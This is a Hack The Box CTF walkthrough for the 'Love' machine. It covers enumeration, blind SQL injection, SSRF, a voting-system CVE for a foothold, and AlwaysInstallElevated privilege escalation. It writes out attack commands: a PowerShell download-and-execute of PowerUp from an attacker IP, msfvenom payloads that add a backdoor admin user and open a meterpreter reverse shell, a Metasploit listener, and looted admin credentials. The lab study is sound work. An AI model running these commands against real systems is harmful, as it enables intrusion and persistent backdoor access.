# Enumeration 
10.129.48.103
## open ports

80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
135/tcp  open  msrpc        Microsoft Windows RPC
139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn
443/tcp  open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
3306/tcp open  mysql?
Discovered open port 5985/tcp on 10.129.48.103

### Port 5000
![[Pasted image 20230113050648.png]]

### port 445 
Anonymous login not permitted 

### port 80
gobuster found /admin

![[Pasted image 20230113044852.png]]

save login request from burp and run it through sqlmap
![[Pasted image 20230113050834.png]]

![[Pasted image 20230113050846.png]]
we have blind sqli 

### port 443

certificate shows 2 domains
![[Pasted image 20230113053208.png]]
adding 2 of them to /etc/hosts

`echo "10.129.48.103 love.htb staging.love.htb" | sudo tee -a /etc/hosts`

![[Pasted image 20230113053328.png]]
![[Pasted image 20230113053348.png]]

### staging.love.htb port 80

![[Pasted image 20230113054542.png]]

/beta.php has interesting stuff
![[Pasted image 20230113061402.png]]
we can access localhost pages from here using SSRF
![[Pasted image 20230113061443.png]]

checking forbbiden pages from earlier 
![[Pasted image 20230113061514.png]]


back to port 80/admin
![[Pasted image 20230113061618.png]]
we are in

# Foothold 

found cve for voter system 
![[Pasted image 20230113062125.png]]

change ip's and path 
![[Pasted image 20230113061838.png]]

![[Pasted image 20230113062142.png]]

![[Pasted image 20230113062150.png]]
and we have a shell

# Privesc 

running powerup

```
powershell -ep bypass
IEX(new-object net.webclient).downloadstring('http://10.10.16.19/PowerUp.ps1')
Invoke-AllChecks

```

![[Pasted image 20230113071622.png]]
![[Pasted image 20230113071907.png]]

first we generate a malicious .msi file and upload it to the target 
let's add new user with admin privs 
```
 msfvenom -p windows/adduser USER=backdoor PASS=Password1! -f msi -o evil.msi
 curl http://10.10.16.19/evil.msi -o ev.msi
 msiexec /quiet /qn /i ev.msi
```
![[Pasted image 20230113073200.png]]
and backdoor user is created now we can login using evil-winrm or psexec 
`evil-winrm -i $ip -u backdoor -p Password1!`
![[Pasted image 20230113073334.png]]
and we are admin

# Metasploit

generate .exe meterpreter  shell 
```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.16.19 LPORT=9007 -f exe -o reverse.exe

```
start listener 

```
msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set lhost 10.10.16.19; set lport 9007; exploit"
```
Upload it to the target and run it 
![[Pasted image 20230113074446.png]]
![[Pasted image 20230113074527.png]]

```
use exploit/windows/local/always_install_elevated 
set session 1
set lhost tun0
run

```
![[Pasted image 20230113074544.png]]
![[Pasted image 20230113074554.png]]


# Loot

vote admin creds:
	username: admin
	password:@LoveIsInTheAir!!!!

---
Tags: #ctf #htb #SSRF #always_installed_elevated
Resources: [Love](https://app.hackthebox.com/machines/344)